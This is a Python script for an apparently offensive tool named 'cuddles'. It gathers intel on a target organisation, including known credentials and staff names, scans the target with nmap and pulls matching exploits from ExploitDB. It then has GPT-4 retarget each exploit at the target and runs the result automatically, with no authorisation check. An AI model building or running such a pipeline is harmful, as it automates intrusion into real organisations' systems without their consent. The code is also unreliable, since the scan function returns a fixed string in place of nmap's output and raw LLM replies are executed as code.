import os
import chromadb
import subprocess
import threading
import time
import pexpect
import re
from openai import OpenAI
from concurrent.futures import ThreadPoolExecutor, as_completed

# Custom exception class
class CuddlesException(Exception):
    pass

# Ensure the OpenAI API key is set
api_key = os.getenv("OPENAI_API_KEY")
if not api_key:
    raise CuddlesException("OpenAI API key not set in environment variables")

# Set the TOKENIZERS_PARALLELISM environment variable to false
os.environ["TOKENIZERS_PARALLELISM"] = "false"

# Initialize the OpenAI client
client = OpenAI()

# ASCII Art Function
def cuddles_art():
    art = """
   ▄████████ ▀████    ▐████▀   ▄▄▄▄███▄▄▄▄    ▄██████▄  ████████▄  ████████▄     ▄████████    ▄████████ 
  ███    ███   ███▌   ████▀  ▄██▀▀▀███▀▀▀██▄ ███    ███ ███   ▀███ ███   ▀███   ███    ███   ███    ███ 
  ███    █▀     ███  ▐███    ███   ███   ███ ███    ███ ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄        ▀███▄███▀    ███   ███   ███ ███    ███ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀        ████▀██▄     ███   ███   ███ ███    ███ ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███    █▄    ▐███  ▀███    ███   ███   ███ ███    ███ ███    ███ ███    ███   ███    █▄  ▀███████████ 
  ███    ███  ▄███     ███▄  ███   ███   ███ ███    ███ ███   ▄███ ███   ▄███   ███    ███   ███    ███ 
  ██████████ ████       ███▄  ▀█   ███   █▀   ▀██████▀  ████████▀  ████████▀    ██████████   ███    ███ 
                                                                                             ███    ███                                                                                   
"""
    return art

# Input validation functions
def validate_ip_or_domain(value):
    ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    domain_pattern = r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(ip_pattern, value) or re.match(domain_pattern, value)

def validate_email(value):
    return '@' in value and '.' in value.split('@')[1]

# Function to get user input with validation
def get_user_input(prompt, validator=None):
    while True:
        response = input(prompt)
        if not response:
            return "Not provided"
        if validator is None or validator(response):
            return response
        print("Invalid input. Please try again.")

# Function to initialize ChromaDB
def initialize_chromadb(client):
    return client.get_or_create_collection(name="cuddles_data")

# Function to save data to ChromaDB
def save_to_chromadb(collection, data):
    org_name = data.get('Organisation name', 'unknown')
    documents = [f"{key}: {value}" for key, value in data.items() if value != "Not provided"]
    ids = [f"{org_name}_{int(time.time())}_{i}" for i in range(len(documents))]
    metadata = [{"org_name": org_name} for _ in range(len(documents))]
    collection.add(documents=documents, ids=ids, metadatas=metadata)

# Function to retrieve data from ChromaDB
def get_chromadb_data(collection, org_name):
    results = collection.query(
        query_texts=[f"Organisation name: {org_name}"],
        where={"org_name": org_name},
        n_results=100
    )
    print("Retrieved documents:", results['documents'])  # Debug print
    return results['documents']

# Function to parse nmap results for open ports and service details
def parse_nmap_results(scan_results):
    open_ports = []
    service_info = []
    for line in scan_results.split('\n'):
        if '/tcp' in line and 'open' in line:
            parts = line.split()
            port = parts[0].split('/')[0].strip()
            service = parts[2]
            version = ' '.join(parts[3:]) if len(parts) > 3 else ''
            open_ports.append(int(port))
            service_info.append((port, service, version))
    return open_ports, service_info

# Function to run nmap scan with real-time output using pexpect
def run_nmap_scan(command):
    try:
        print("\nRunning nmap command:")
        print(command)
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
        
        for line in iter(process.stdout.readline, ''):
            print(line, end='')
        
        process.stdout.close()
        return_code = process.wait()
        
        if return_code != 0:
            raise CuddlesException(f"nmap command failed with return code {return_code}")
        
        return "Nmap scan completed."
    except Exception as e:
        raise CuddlesException(f"nmap command failed: {str(e)}")
    
# Function to save scan results to ChromaDB
def save_scan_results_to_chromadb(collection, org_name, scan_results):
    document_id = f"{org_name.replace(' ', '_').lower()}_scan_{int(time.time())}"
    document_content = f"Organization Name: {org_name}\nScan Results:\n{scan_results}"
    metadata = {"org_name": org_name, "type": "scan_result"}
    collection.add(documents=[document_content], ids=[document_id], metadatas=[metadata])

# Function to display progress
def show_progress(stop_event, timeout=300):  # 5 minutes timeout
    start_time = time.time()
    while not stop_event.is_set():
        for i in range(1, 4):
            if stop_event.is_set() or time.time() - start_time > timeout:
                return
            print(f"\rScanning{'.' * i}", end="", flush=True)
            stop_event.wait(0.5)  # Wait for 0.5 seconds or until the event is set
    print("\rScan completed.    ")

# Function to search ExploitDB for exploits
def search_exploitdb(service, version):
    search_query = f"{service} {version}"
    print(f"Searching ExploitDB for: {search_query}")
    result = subprocess.run(f"searchsploit {search_query}", shell=True, capture_output=True, text=True)
    return result.stdout

# Function to download exploits using searchsploit
def download_exploit(path):
    print(f"Downloading exploit from path: {path}")
    result = subprocess.run(f"searchsploit -m {path}", shell=True, capture_output=True, text=True)
    return result.returncode == 0

# Function to modify exploits using LLM
def modify_exploit_with_llm(exploit_code, ip, port):
    prompt = f"""
    Modify the following exploit to target IP {ip} and port {port}:

    Exploit:
    {exploit_code}

    Ensure the exploit points to the correct target and include any necessary adjustments.
    """
    try:
        response = client.chat.completions.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000
        )
        modified_exploit = response.choices[0].message.content.strip()
        return modified_exploit
    except Exception as e:
        raise CuddlesException(f"Error modifying exploit with LLM: {str(e)}")

# Function to write exploit to a file
def write_exploit_to_file(exploit_code, filename):
    try:
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, 'w') as file:
            file.write(exploit_code)
    except Exception as e:
        raise CuddlesException(f"Error writing exploit to file: {str(e)}")

# Function to run exploit
def run_exploit(filename, ip, port):
    try:
        result = subprocess.run(f"python3 {filename} {ip} {port}", shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        raise CuddlesException(f"Error running exploit: {str(e)}")

# Main function
def main():
    try:
        print(cuddles_art())
        print("Welcome to cuddles. Please provide information about the target.")
        print("If you don't have a piece of information simply press return for the next question.")
        print("You must enter an organisation name:")

        # Stage 1: User Intel Request
        questions = {
            "Organisation name": ("Please enter the organisation name: ", None),
            "Known domains and IPs": ("Please enter known domains and IPs separated by commas: ", 
                                      lambda x: all(validate_ip_or_domain(item.strip()) for item in x.split(','))),
            "Known email addresses": ("Please enter known email addresses separated by commas: ", 
                                      lambda x: all(validate_email(item.strip()) for item in x.split(','))),
            "Known credentials": ("Known credentials (e.g., annie94:superpassword) separated by commas: ", None),
            "Known names of members": ("Please enter known names of members: ", None),
            "Known technologies": ("Please enter known technologies being used by the organisation: ", None),
            "Known repository URLs": ("Please enter known repository URLs for git or similar: ", None),
            "Any other useful information": ("Please enter any other known useful information: ", None)
        }

        responses = {}

        for key, (question, validator) in questions.items():
            responses[key] = get_user_input(question, validator)

        org_name = responses["Organisation name"]

        if org_name == "Not provided":
            raise CuddlesException("Organisation name is required. Exiting.")

        # Initialize ChromaDB client and get the collection
        client = chromadb.PersistentClient(path="./data")
        collection = initialize_chromadb(client)

        # Save to ChromaDB
        save_to_chromadb(collection, responses)
        print(f"Information saved to the database under collection 'cuddles_data'")


        # Stage 2: Extract and Scan
        print("Starting the process to retrieve information and run nmap scan.")
        documents = get_chromadb_data(collection, org_name)
        if not documents:
            raise CuddlesException(f"No data found for organisation '{org_name}'. Exiting.")

        ips_and_domains = []
        for doc in documents:
            for item in doc:
                if 'Known domains and IPs:' in item:
                    ips_and_domains_str = item.split('Known domains and IPs:')[-1].strip()
                    ips_and_domains.extend([ip.strip() for ip in ips_and_domains_str.split(',')])

        print("Extracted IPs and domains:", ips_and_domains)  # Debug print

        if not ips_and_domains:
            raise CuddlesException(f"No IP addresses or domains found for organisation '{org_name}'. Exiting.")

        # Shallow scan
        shallow_scan_command = f"nmap {' '.join(ips_and_domains)} -sV"
        scan_result = run_nmap_scan(shallow_scan_command)

        open_ports, service_info = parse_nmap_results(scan_result)
#        if not open_ports:
            # Deeper scan if no open ports found
#            deep_scan_command = f"nmap {' '.join(ips_and_domains)} -p- -sC -sV"
#            print("No open ports found with shallow scan. Performing deeper scan.")
#            scan_result = run_nmap_scan(deep_scan_command)

#            open_ports, service_info = parse_nmap_results(scan_result)

        print("\nNmap scan results:")
        print(scan_result)
        save_scan_results_to_chromadb(collection, org_name, scan_result)

        # Stage 3: Active Phase
        with ThreadPoolExecutor() as executor:
            futures = []
            for port, service, version in service_info:
                futures.append(executor.submit(search_exploitdb, service, version))

            for future in as_completed(futures):
                exploits = future.result()
                print(f"ExploitDB results:\n{exploits}")

                # Extract paths of found exploits
                exploit_paths = [line.split('|')[-1].strip() for line in exploits.split('\n') if '|' in line and not line.startswith('-') and 'Path' not in line]

                # Download and modify each exploit
                for path in exploit_paths:
                    if download_exploit(path):
                        exploit_filename = os.path.basename(path)
                        with open(exploit_filename, 'r') as file:
                            original_exploit_code = file.read()

                        if exploit_filename.endswith('.py'):
                            modified_exploit_code = modify_exploit_with_llm(original_exploit_code, ips_and_domains[0], port)
                            modified_exploit_filename = os.path.join('tools', 'exploit_mods', f"modified_{exploit_filename}")
                            write_exploit_to_file(modified_exploit_code, modified_exploit_filename)
                            exploit_result = run_exploit(modified_exploit_filename, ips_and_domains[0], port)
                            print(f"Exploit results for {service} on port {port}:\n{exploit_result}")
                        else:
                            print(f"Skipping non-Python exploit: {exploit_filename}")

    except CuddlesException as e:
        print(f"Error: {str(e)}")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")

if __name__ == "__main__":
    main()